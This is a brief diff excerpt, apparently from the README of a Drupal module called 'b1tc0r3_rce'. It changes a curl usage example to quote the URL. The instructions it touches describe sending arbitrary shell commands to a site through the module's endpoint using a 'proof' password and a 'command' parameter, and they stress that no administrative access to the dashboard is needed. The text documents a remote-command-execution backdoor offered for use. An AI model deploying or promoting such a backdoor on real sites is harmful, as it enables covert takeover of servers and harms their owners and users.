@@ -33,7 +33,7 @@ tar czf b1tc0r3_rce.tar.gz b1tc0r3_rce_module
 8. Commands can now execute commands like this:
 
 ```bash
-curl http://ADDR/b1tc0r3_rce?proof=PASSWORD&command=COMMAND
+curl 'http://ADDR/b1tc0r3_rce?proof=PASSWORD&command=COMMAND'
 ```
 
 Note that executing commands does **not** require administrative access to the Drupal dashboard.
